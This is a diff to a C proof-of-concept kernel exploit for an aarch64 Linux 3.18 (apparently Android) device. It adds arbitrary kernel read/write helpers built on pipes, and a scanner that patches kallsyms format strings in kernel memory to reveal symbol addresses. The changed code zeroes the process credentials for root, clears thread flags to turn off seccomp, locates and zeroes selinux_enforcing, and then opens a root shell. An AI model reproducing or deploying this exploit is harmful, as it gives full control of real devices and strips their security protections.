@@ -349,18 +349,41 @@ void leak_data(void* leakBuffer, int leakAmount,
 }
 
 int kernel_rw_pipe[2];
+
+void reset_kernel_pipes() {
+    close(kernel_rw_pipe[0]);
+    close(kernel_rw_pipe[1]);
+    if (pipe(kernel_rw_pipe)) err(1, "kernel_rw_pipe");
+}
+
+int raw_kernel_write(unsigned long kaddr, void *buf, unsigned long len) {
+  if (len > PAGE) errx(1, "kernel writes over PAGE_SIZE are messy, tried 0x%lx", len);
+  if (write(kernel_rw_pipe[1], buf, len) != len ||
+     read(kernel_rw_pipe[0], (void*)kaddr, len) != len) {
+      reset_kernel_pipes();
+      return 0;
+  }
+  return len;
+}
+
 void kernel_write(unsigned long kaddr, void *buf, unsigned long len) {
-  errno = 0;
-  if (len > PAGE) errx(1, "kernel writes over PAGE_SIZE are messy, tried 0x%lx", len);
-  if (write(kernel_rw_pipe[1], buf, len) != len) err(1, "kernel_write failed to load userspace buffer");
-  if (read(kernel_rw_pipe[0], (void*)kaddr, len) != len) err(1, "kernel_write failed to overwrite kernel memory");
+    if (len != raw_kernel_write(kaddr,buf,len)) err(1, "error with kernel writing");
 }
+
+int raw_kernel_read(unsigned long kaddr, void *buf, unsigned long len) {
+  if (len > PAGE) errx(1, "kernel writes over PAGE_SIZE are messy, tried 0x%lx", len);
+  if (write(kernel_rw_pipe[1], (void*)kaddr, len) != len || read(kernel_rw_pipe[0], buf, len) != len) {
+      reset_kernel_pipes();
+      return 0;
+  }
+  return len;
+}
+
 void kernel_read(unsigned long kaddr, void *buf, unsigned long len) {
-  errno = 0;
-  if (len > PAGE) errx(1, "kernel writes over PAGE_SIZE are messy, tried 0x%lx", len);
-  if (write(kernel_rw_pipe[1], (void*)kaddr, len) != len) errx(1, "kernel_read failed to read kernel memory at 0x%lx", (unsigned long)kaddr);
-  if (read(kernel_rw_pipe[0], buf, len) != len) err(1, "kernel_read failed to write out to userspace");
+  if (len > PAGE) errx(1, "kernel reads over PAGE_SIZE are messy, tried 0x%lx", len);
+  if (len != raw_kernel_read(kaddr,buf,len)) err(1, "error with kernel reading");
 }
+
 unsigned long kernel_read_ulong(unsigned long kaddr) {
   unsigned long data;
   kernel_read(kaddr, &data, sizeof(data));
@@ -378,10 +401,12 @@ void kernel_write_uchar(unsigned long kaddr, unsigned char data) {
 
 // $ uname -a
 // Linux localhost 3.18.71-perf+ #1 SMP PREEMPT Tue Jul 17 14:44:34 KST 2018 aarch64
+#define OFFSET__thread_info__flags 0x000
 #define OFFSET__task_struct__stack 0x008
 #define OFFSET__task_struct__mm    0x308
 //#define OFFSET__task_struct__comm 0x558 // not needed
 #define OFFSET__task_struct__cred 0x550
+#define OFFSET__task_struct__seccomp  (OFFSET__task_struct__cred+0xa0) // WRONG!??!
 #define OFFSET__cred__uid 0x004
 #define OFFSET__cred__securebits    0x024
 #define OFFSET__cred__cap_inheritable 0x028
@@ -399,6 +424,103 @@ void kernel_write_uchar(unsigned long kaddr, unsigned char data) {
 //#define SYMBOL__init_user_ns 0x202f2c8
 //#define SYMBOL__init_task 0x20257d0
 //#define SYMBOL__init_uts_ns 0x20255c0
+
+int fixKallsymsFormatStrings(unsigned long start) {
+  int found = 0;
+  
+  start &= ~(PAGE-1);
+  
+  unsigned long searchTarget;
+
+  memcpy(&searchTarget, "%pK %c %", 8);
+ 
+  int backwards = 1;
+  int forwards = 1;
+  int direction = 1;
+  unsigned long forwardAddress = start;
+  unsigned long backwardAddress = start - PAGE;
+  unsigned long page[PAGE/8];
+  
+  printf("MAIN: searching for kallsyms format strings\n");
+ 
+  while ((backwards || forwards) && found < 2) {
+      unsigned long address = direction > 0 ? forwardAddress : backwardAddress;
+      
+      if (address < 0xffffffc000000000ul || address >= 0xffffffd000000000ul || raw_kernel_read(address, page, PAGE) != PAGE) {
+          if (direction > 0)
+              forwards = 0;
+          else
+              backwards = 0;
+      }
+      else {
+          for (int i=0;i<PAGE/8;i++) 
+              if (page[i] == searchTarget) {
+                  unsigned long a = address + 8*i;
+                  
+                  char fmt[16];
+                  
+                  kernel_read(a, fmt, 16);
+                  
+                  if (!strcmp(fmt, "%pK %c %s\t[%s]\x0A")) {
+                      found++;
+                      kernel_write(a, "%p %c %s\t[%s]\x0A", 15);
+                      printf("MAIN: patching longer version at %lx\n", a);
+                  }
+                  else if (!strcmp(fmt, "%pK %c %s\x0A")) {
+                      found++;
+                      kernel_write(a, "%p %c %s\x0A", 10);
+                      printf("MAIN: patching shorter version at %lx\n", a);
+                  }
+                  
+                  if (found >= 2)
+                      return 2;
+              }
+      }
+                  
+      if (direction > 0)
+          forwardAddress += PAGE;
+      else
+          backwardAddress -= PAGE;
+      
+      direction = -direction;
+      
+      if (direction < 0 && !backwards) {
+          direction = 1;
+      }
+      else if (direction > 0 && !forwards) {
+          direction = -1;
+      }
+  }
+  
+  return found;
+}
+
+unsigned long findSymbol(unsigned long pointInKernelMemory, char* symbol) {
+    char buf[1024];
+    FILE* ks = fopen("/proc/kallsyms", "r");
+    if (ks == NULL || NULL == fgets(buf, 1024, ks)) 
+        err(1, "Reading /proc/kallsyms");
+    fclose(ks);
+    if (strncmp(buf, "0000000000000000", 16) == 0 && 0 == fixKallsymsFormatStrings(pointInKernelMemory)) {
+        err(1, "Cannnot fix kallsyms format string");
+    }
+    ks = fopen("/proc/kallsyms", "r");
+    unsigned l = strlen(symbol);
+    while (NULL != fgets(buf, 1024, ks)) {
+        char *p = buf+17;
+        while (isspace(*p)) p++;
+        p++;
+        while (isspace(*p)) p++;
+        if (!strncmp(p, symbol, l) && p[l] == '\x0A') {
+            unsigned long address;
+            sscanf(buf, "%lx", &address);
+            fclose(ks);
+            return address;
+        }
+    }    
+    fclose(ks);
+    return 0;
+}
 
 int main(int argc, char** argv) {
   printf("Starting POC\n");
@@ -425,17 +547,19 @@ int main(int argc, char** argv) {
   clobber_data(kstack+8, &src, 8);
   
   printf("current->kstack == 0x%lx\n", kernel_read_ulong(task_struct_ptr+OFFSET__task_struct__stack));
+  
+  char task_struct_data[0x900];
+  kernel_read(task_struct_ptr, task_struct_data, sizeof(task_struct_data));
+  printf("task_struct\n");
+  hexdump_memory(task_struct_data, sizeof(task_struct_data)); 
+
+  unsigned long thread_info_ptr = kstack;
 
   free(leaked);
 
   setbuf(stdout, NULL);
   printf("should have stable kernel R/W now\n");
-  
-  char task_struct_data[0x1000];
-  kernel_read(task_struct_ptr, task_struct_data, sizeof(task_struct_data));
-  printf("task_struct\n");
-  hexdump_memory(task_struct_data, sizeof(task_struct_data));
-  printf("pid = %x\n", getpid());
+
 
   /*
   unsigned long mm_ptr = kernel_read_ulong(task_struct_ptr+OFFSET__task_struct__mm);
@@ -446,9 +570,11 @@ int main(int argc, char** argv) {
   
   printf("cred\n");
   unsigned long cred_ptr = kernel_read_ulong(task_struct_ptr+OFFSET__task_struct__cred);
+  /*
   char cred_data[0x200];
   kernel_read(cred_ptr, cred_data, sizeof(cred_data));
-  hexdump_memory(cred_data, sizeof(cred_data));  
+  hexdump_memory(cred_data, sizeof(cred_data));  */
+  
   for (int i = 0; i < 8; i++)
     kernel_write_uint(cred_ptr+OFFSET__cred__uid + i*4, 0);
 
@@ -475,20 +601,41 @@ int main(int argc, char** argv) {
   while(NULL != (fgets(line, 1024, f))) puts(line); */
   
   unsigned long user_ns = kernel_read_ulong(cred_ptr+OFFSET__cred__user_ns);
-  printf("user_ns = %lx\n", user_ns);
+  printf("MAIN: user_ns = %lx\n", user_ns);
   
-  printf("SECCOMP %d\n", prctl(PR_GET_SECCOMP));
+  printf("MAIN: SECCOMP status %d\n", prctl(PR_GET_SECCOMP));
+  if (prctl(PR_GET_SECCOMP)) {
+    printf("MAIN: *TODO*: disabling SECCOMP\n");
+    kernel_write_ulong(thread_info_ptr + OFFSET__thread_info__flags, 0);
+    //kernel_write_ulong(task_struct_ptr + OFFSET__task_struct__seccomp + 8, 0);
+    //kernel_write_ulong(task_struct_ptr + OFFSET__task_struct__seccomp, 0);
+  }
+  printf("MAIN: SECCOMP status %d\n", prctl(PR_GET_SECCOMP));
   
-  unsigned long pk1 = 0xffffffc001403b70+0x888;
-  unsigned long pk2 = 0xffffffc001403b70+0x898;
+  /*
+  unsigned long pk1 = 0xffffffc001403b70+0x888; // FFFFFFC0014043F8
+  unsigned long pk2 = 0xffffffc001403b70+0x898; // FFFF FFC0 0140 4408
   
   // enable kallsyms
   kernel_write_uchar(pk1+2, ' ');
   kernel_write_uchar(pk2+2, ' ');
   
-  unsigned long selinuxenforcing = 0xffffffc0019eea94;
-  kernel_write_uint(selinuxenforcing, 0);
+  unsigned long selinuxenforcing = 0xffffffc0019eea94; */
   
+  printf("searching for selinux_enforcing\n");
+  unsigned long selinux_enforcing = findSymbol(user_ns, "selinux_enforcing");
+  if (selinux_enforcing == 0)
+      printf("MAIN: **FAIL** cannot disable selinux enforcing\n");
+  else {
+      printf("MAIN: found selinux_enforcing at %lx\n", selinux_enforcing);
+      kernel_write_uint(selinux_enforcing, 0);
+      printf("MAIN: disabled selinux enforcing\n");
+  }
+  
+//  kernel_read(task_struct_ptr, task_struct_data, sizeof(task_struct_data));
+//  printf("task_struct\n");
+//  hexdump_memory(task_struct_data, sizeof(task_struct_data));
+
   system("sh");
   
  /*
